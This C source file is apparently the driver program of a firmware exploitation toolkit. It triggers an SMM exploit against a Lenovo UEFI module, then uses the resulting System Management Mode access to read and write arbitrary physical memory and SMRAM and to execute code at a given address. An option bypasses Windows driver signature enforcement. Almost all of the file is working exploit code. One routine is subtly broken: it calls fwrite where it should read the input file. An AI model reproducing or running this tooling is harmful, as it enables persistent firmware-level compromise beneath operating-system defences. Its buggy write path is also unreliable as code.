#include "stdafx.h"

#if !defined(strtoull)

// fucking Microsoft
#define strtoull _strtoui64

#endif

// make crt functions inline
#pragma intrinsic(memcpy)

#define SMM_HANDLER_OP_NONE             0   // do nothing, just check for successful exploitation
#define SMM_HANDLER_OP_PHYS_MEM_READ    1   // read physical memory from SMM
#define SMM_HANDLER_OP_PHYS_MEM_WRITE   2   // write physical memory from SMM
#define SMM_HANDLER_OP_EXECUTE          3   // execute SMM code at specified physical address

typedef void (* SMM_PROC)(void);

typedef struct _SMM_HANDLER_CONTEXT
{
    unsigned int op;
    int status;

    union
    {
        struct // for SMM_HANDLER_OP_PHYS_MEM_READ
        {
            void *addr;
            unsigned int size;
            unsigned char data[];

        } phys_mem_read;

        struct // for SMM_HANDLER_OP_PHYS_MEM_WRITE
        {
            void *addr;
            unsigned int size;
            unsigned char data[];

        } phys_mem_write;

        struct // for SMM_HANDLER_OP_EXECUTE
        {
            SMM_PROC addr;

        } execute;
    };

} SMM_HANDLER_CONTEXT,
*PSMM_HANDLER_CONTEXT;
//--------------------------------------------------------------------------------------
static void smm_handler(void *context)
{
    int status = -1;
    PSMM_HANDLER_CONTEXT handler_context = (PSMM_HANDLER_CONTEXT)context;    

    switch (handler_context->op)
    {
    case SMM_HANDLER_OP_NONE:

        // do nothing
        status = 0;
        break;

    case SMM_HANDLER_OP_PHYS_MEM_READ:

        // read physical memory
        memcpy(
            &handler_context->phys_mem_read.data,
            handler_context->phys_mem_read.addr,
            handler_context->phys_mem_read.size
        );

        status = 0;
        break;

    case SMM_HANDLER_OP_PHYS_MEM_WRITE:

        // write physical memory
        memcpy(
            handler_context->phys_mem_read.addr,
            &handler_context->phys_mem_read.data,            
            handler_context->phys_mem_read.size
        );

        status = 0;
        break;

    case SMM_HANDLER_OP_EXECUTE:

        // run specified code
        if (handler_context->execute.addr)
        {
            handler_context->execute.addr();
        }        

        status = 0;
        break;

    default:

        break;
    }

    handler_context->status = status;
}
//--------------------------------------------------------------------------------------
bool test(void)
{
    bool ret = false;

    printf("**************************************\n");
    printf("Running tests...\n");

    /*
        Test physical memory read and write.
    */
    {
        unsigned long long addr = 0x1000, old = 0;
        unsigned long long val = 0x0807060504030201;

        if (!uefi_expl_phys_mem_read(addr, sizeof(old), (unsigned char *)&old))
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_phys_mem_read() fails\n");
            goto _end;
        }

        printf(__FUNCTION__"(): Old value from 0x%llx is 0x%llx\n", addr, old);

        if (uefi_expl_phys_mem_write(addr, sizeof(val), (unsigned char *)&val))
        {
            unsigned int low = 0, high = 0;

            if (uefi_expl_phys_mem_read(addr, sizeof(low), (unsigned char *)&low) &&
                uefi_expl_phys_mem_read(addr + 4, sizeof(high), (unsigned char *)&high))
            {
                printf(__FUNCTION__"(): Readed values are 0x%.8x`%.8x\n", high, low);

                if (high == 0x08070605 && low == 0x04030201)
                {
                    ret = true;
                }
            }
            else
            {
                printf(__FUNCTION__"() ERROR: uefi_expl_phys_mem_read() fails\n");
            }

            // restore overwritten memory
            uefi_expl_phys_mem_write(addr, sizeof(old), (unsigned char *)&old);
        }
        else
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_phys_mem_write() fails\n");
        }
    }

    if (!ret)
    {
        fprintf(stderr, __FUNCTION__"(): Error in test #1\n");
        goto _end;
    }

    /*
        Test PCI config space and I/O ports API.
    */
    ret = false;

    {
        unsigned int pci_addr = PCI_ADDR(0, 0, 0, 0);
        unsigned long long val = 0;

        val |= pci_addr;

        // read VID/DID of PCI device 00:00.0 (host bridge) manually using I/O ports
        if (uefi_expl_port_write(0xcf8, U32, val))
        {
            val = 0;

            if (uefi_expl_port_read(0xcfc, U32, &val))
            {
                unsigned short vid = (unsigned short)((val >> 0) & 0xffff),
                               did = (unsigned short)((val >> 16) & 0xffff);

                printf(__FUNCTION__"(): Host bridge VID = 0x%.4x, DID = 0x%.4x\n", vid, did);

                val = 0;

                if (uefi_expl_pci_read(pci_addr, U32, &val))
                {
                    if (vid == (unsigned short)((val >> 0) & 0xffff) &&
                        did == (unsigned short)((val >> 16) & 0xffff))
                    {
                        ret = true;
                    }
                }
                else
                {
                    printf(__FUNCTION__"() ERROR: uefi_expl_pci_read() fails\n");
                }
            }
            else
            {
                printf(__FUNCTION__"() ERROR: uefi_expl_port_read() fails\n");
            }
        }
        else
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_port_write() fails\n");
        }
    }

    if (!ret)
    {
        fprintf(stderr, __FUNCTION__"(): Error in test #2\n");
        goto _end;
    }

    /*
        Test memory alloc/free and virtual to physical address translation.
    */
    ret = false;

    {
        unsigned long long addr = 0, phys_addr = 0;

        if (uefi_expl_mem_alloc(PAGE_SIZE, &addr, &phys_addr))
        {
            unsigned long long phys_addr_2 = 0;

            printf(__FUNCTION__"(): Memory allocated at address 0x%llx\n", addr);

            if (uefi_expl_phys_addr(addr, &phys_addr_2))
            {
                printf(__FUNCTION__"(): Physical address for 0x%llx is 0x%llx\n", addr, phys_addr_2);

                ret = phys_addr == phys_addr_2;
            }
            else
            {
                printf(__FUNCTION__"() ERROR: uefi_expl_phys_addr() fails\n");
            }

            if (!uefi_expl_mem_free(addr))
            {
                printf(__FUNCTION__"() ERROR: uefi_expl_mem_free() fails\n");
            }
        }
        else
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_mem_alloc() fails\n");
        }
    }

    if (!ret)
    {
        fprintf(stderr, __FUNCTION__"(): Error in test #3\n");
        goto _end;
    }

_end:

    printf("%s\n", ret ? "SUCCESS" : "FAILS");
    printf("**************************************\n");

    return ret;
}
//--------------------------------------------------------------------------------------
int _tmain(int argc, _TCHAR* argv[])
{
    int ret = -1, target = -1;    
    SMM_HANDLER_CONTEXT context, *c = &context;
    const char *data_file = NULL;
    bool use_dse_bypass = false;

    memset(&context, 0, sizeof(context));
    context.op = SMM_HANDLER_OP_NONE;

    // parse command line options
    for (int i = 1; i < argc; i++)
    {
        if (!strcmp(argv[i], "--exec") && i < argc - 1)
        {
            context.op = SMM_HANDLER_OP_EXECUTE;

            // execute SMM code at given physical addres
            context.execute.addr = (SMM_PROC)strtoull(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid address specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--phys-mem-read") && i < argc - 1)
        {
            context.op = SMM_HANDLER_OP_PHYS_MEM_READ;

            // read memory (one page by default)
            context.phys_mem_read.size = PAGE_SIZE;
            context.phys_mem_read.addr = (void *)strtoull(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid address specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--phys-mem-write") && i < argc - 1)
        {
            context.op = SMM_HANDLER_OP_PHYS_MEM_WRITE;

            // write memory (--file option is mandatory)
            context.phys_mem_read.size = 0;
            context.phys_mem_read.addr = (void *)strtoull(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid address specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--length") && i < argc - 1)
        {
            // update read memory length value
            context.phys_mem_read.size = strtoul(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid length specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--target") && i < argc - 1)
        {
            // update target model number
            target = strtoul(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid target number specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--target-list"))
        {
            // print available targets and exit
            expl_lenovo_SystemSmmAhciAspiLegacyRt_targets_info();
            goto _end;
        }
        else if (!strcmp(argv[i], "--file") && i < argc - 1)
        {
            // use file to read or write SMRAM data
            data_file = argv[i + 1];

            i += 1;
        }
        else if (!strcmp(argv[i], "--dse-bypass"))
        {
            // bypass Windows x64 DSE
            use_dse_bypass = true;
        }        
        else if (!strcmp(argv[i], "--test"))
        {
            // run libfwexpl tests
            test();
            goto _end;
        }
    }

    if (context.op == SMM_HANDLER_OP_PHYS_MEM_WRITE)
    {
        if (data_file)
        {

#ifdef WIN32

            struct _stat file_info;
    
            // get file info on Windows
            if (_stat(data_file, &file_info) != 0)
#else
            struct stat file_info;

            // get file info on *nix
            if (stat(data_file, &file_info) != 0)
#endif
            {
                printf("ERROR: stat() fails for file \"%s\"\n", data_file);
                return -1;
            }

            if (file_info.st_size == 0)
            {
                printf("ERROR: specified file is empty\n");
                return -1;
            }

            // use input file size as memory write length
            context.phys_mem_write.size = file_info.st_size;
        }
        else
        {
            printf("ERROR: --phys-mem-write reuires --file option\n");
        }
    }

    // initialize HAL
    if (uefi_expl_init(NULL, use_dse_bypass))
    {         
        // determinate memory size required for SMM_HANDLER_CONTEXT
        unsigned int new_size = sizeof(SMM_HANDLER_CONTEXT);        

        if (context.op == SMM_HANDLER_OP_PHYS_MEM_READ ||
            context.op == SMM_HANDLER_OP_PHYS_MEM_WRITE)            
        {
            new_size += (context.op == SMM_HANDLER_OP_PHYS_MEM_READ) ? 
                                       context.phys_mem_read.size :
                                       context.phys_mem_write.size;            
        }

        // to make uefi_expl_mem_alloc() happy
        new_size = XALIGN_UP(new_size, PAGE_SIZE);

        if (new_size > sizeof(SMM_HANDLER_CONTEXT))
        {
            if ((c = (SMM_HANDLER_CONTEXT *)malloc(new_size)) == NULL)
            {
                return -1;
            }

            memset(c, 0, new_size);
            memcpy(c, &context, sizeof(context));

            // read input file to write into the SMRAM
            if (context.op == SMM_HANDLER_OP_PHYS_MEM_WRITE)
            {
                FILE *f = fopen(data_file, "rb");
                if (f)
                {
                    fwrite(c->phys_mem_write.data, 1, c->phys_mem_write.size, f);
                    fclose(f);

                    printf("%d bytes readed to the \"%s\"\n", c->phys_mem_write.size, data_file);
                }
                else
                {
                    printf("ERROR: Unable to open input file \"%s\"\n", data_file);
                    return -1;
                }
            }
        }

        unsigned long long addr = 0, phys_addr = 0;

        // copy SMM_HANDLER_CONTEXT to continious physical memory buffer
        if (uefi_expl_mem_alloc(new_size, &addr, &phys_addr))
        {
            if (uefi_expl_phys_mem_write(phys_addr, new_size, (unsigned char *)c))
            {
                // run exploit
                if (expl_lenovo_SystemSmmAhciAspiLegacyRt(target, smm_handler, (void *)phys_addr))
                {
                    // read SMM_HANDLER_CONTEXT with data returned by smm_handler()
                    if (uefi_expl_phys_mem_read(phys_addr, new_size, (unsigned char *)c))
                    {
                        if (c->op == SMM_HANDLER_OP_PHYS_MEM_READ)
                        {
                            if (data_file)
                            {
                                // save readed memory to file
                                FILE *f = fopen(data_file, "wb");
                                if (f)
                                {
                                    fwrite(c->phys_mem_read.data, 1, c->phys_mem_read.size, f);
                                    fclose(f);

                                    printf("%d bytes written to the \"%s\"\n", c->phys_mem_read.size, data_file);
                                }
                                else
                                {
                                    printf("ERROR: Unable to create output file \"%s\"\n", data_file);
                                    return -1;
                                }
                            }
                            else
                            {
                                // print readed memory to screen
                                hexdump(c->phys_mem_read.data, c->phys_mem_read.size);
                            }                            
                        }

                        ret = 0;
                    }
                    else
                    {
                        printf("ERROR: uefi_expl_mem_read() fails\n");
                    }
                }                
            }
            else
            {
                printf("ERROR: uefi_expl_mem_write() fails\n");
            }
        }        
        else
        {
            printf("ERROR: uefi_expl_mem_alloc() fails\n");
        }

        if (new_size > sizeof(SMM_HANDLER_CONTEXT))
        {
            free(c);
        }
_end:
        // uninitialize HAL
        uefi_expl_uninit();
    }
    else
    {
        printf("ERROR: uefi_expl_init() fails\n");
    }

    printf("Press any key to quit...\r\n");
    getch();

    ExitProcess(0);

    return ret;
}
//--------------------------------------------------------------------------------------
// EoF
